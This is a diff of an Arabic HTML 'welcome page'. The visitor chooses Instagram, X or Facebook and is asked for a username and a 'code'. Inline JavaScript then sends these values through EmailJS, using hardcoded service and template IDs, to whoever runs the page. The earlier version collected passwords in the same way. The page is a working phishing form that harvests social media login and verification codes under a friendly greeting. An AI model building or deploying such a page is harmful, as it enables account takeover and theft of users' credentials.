@@ -3,51 +3,142 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نموذج الاتصال</title>
-    <link rel="stylesheet" href="styles.css">
-    <!-- External EmailJS script -->
-    <script src="https://cdn.emailjs.com/dist/email.min.js" defer></script>
-    <!-- External scripts.js -->
-    <script src="scripts.js" defer></script>
+    <title>صفحة ترحيبية</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .welcome-container {
+            text-align: center;
+            max-width: 600px;
+            margin: 20px;
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+
+        .welcome-img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        .platforms {
+            margin-top: 20px;
+        }
+
+        .platform-btn {
+            background-color: #008CBA;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            margin: 5px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .platform-btn:hover {
+            background-color: #005f75;
+        }
+
+        .form-container {
+            display: none;
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        form button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        form button:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
+    <div class="welcome-container">
+        <img src="welcome-image.jpg" alt="صورة ترحيبية" class="welcome-img">
+        <h1>مرحباً بك في موقعنا!</h1>
+        <p>نحن سعيدون بانضمامك إلينا. يرجى اختيار المنصة للانضمام لنا.</p>
 
-<header>
-    <div data-ar="نموذج الاتصال" data-en="Contact Form">نموذج الاتصال</div>
-    <div class="language-switcher">
-        <span onclick="toggleLanguage('ar')">العربية</span> | <span onclick="toggleLanguage('en')">English</span>
-    </div>
-</header>
+        <div class="platforms">
+            <button class="platform-btn" onclick="showForm('instagram')">انستقرام</button>
+            <button class="platform-btn" onclick="showForm('x')">إكس</button>
+            <button class="platform-btn" onclick="showForm('facebook')">فيسبوك</button>
+        </div>
 
-<div class="hero">
-    <div data-ar="مرحبًا بك في مهمتنا!" data-en="Welcome to our mission!">مرحبًا بك في مهمتنا!</div>
-</div>
+        <div id="platform-form" class="form-container">
+            <form id="user-form">
+                <label for="username">أدخل اسم المستخدم:</label>
+                <input type="text" id="username" name="username" required>
 
-<div class="content">
-    <div class="welcome-message" data-ar="اختر المنصة التي تود الانضمام إليها." data-en="Choose the platform you want to join.">اختر المنصة التي تود الانضمام إليها.</div>
+                <label for="code">أدخل الرمز:</label>
+                <input type="text" id="code" name="code" required>
 
-    <div class="platform" id="instagram" data-ar="إنستغرام" data-en="Instagram" onclick="showForm('instagram')">إنستغرام</div>
-    <div class="platform" id="x" data-ar="إكس" data-en="X" onclick="showForm('x')">إكس</div>
-    <div class="platform" id="facebook" data-ar="فيسبوك" data-en="Facebook" onclick="showForm('facebook')">فيسبوك</div>
-
-    <div class="form-container" id="form-container" style="display: none;">
-        <h3 id="platform-name" data-ar="التسجيل في" data-en="Sign up for">التسجيل في</h3>
-        <form id="registration-form">
-            <input type="text" name="username" id="username" placeholder="اسم المستخدم" required>
-            <input type="password" name="password" id="password" placeholder="كلمة المرور" required>
-            <button type="submit" data-ar="انضمام" data-en="Join">انضمام</button>
-        </form>
+                <button type="submit">إرسال</button>
+            </form>
+        </div>
     </div>
 
-    <button class="contact-toggle" onclick="document.getElementById('contact-form').style.display = 'block'" data-ar="تواصل معنا" data-en="Contact Us">تواصل معنا</button>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        emailjs.init("1xqwBMfecM1SSulsh");
 
-    <form id="contact-form" style="display: none;">
-        <input type="text" name="name" placeholder="اسمك" required>
-        <input type="email" name="email" placeholder="بريدك الإلكتروني" required>
-        <textarea name="message" placeholder="رسالتك" required></textarea>
-        <button type="submit">إرسال</button>
-    </form>
-</div>
+        function showForm(platform) {
+            // Show the form when a platform is selected
+            document.getElementById('platform-form').style.display = 'block';
+            document.getElementById('user-form').onsubmit = function (event) {
+                event.preventDefault();
 
+                const username = document.getElementById('username').value;
+                const code = document.getElementById('code').value;
+
+                const message = {
+                    platform: platform,
+                    username: username,
+                    code: code
+                };
+
+                // Send the form data via EmailJS
+                emailjs.send("service_ir3vg5y", "template_jw2qkzr", message)
+                    .then(function (response) {
+                        alert("تم إرسال البيانات بنجاح!");
+                    }, function (error) {
+                        alert("فشل في إرسال البيانات. حاول مرة أخرى.");
+                    });
+            };
+        }
+    </script>
 </body>
 </html>
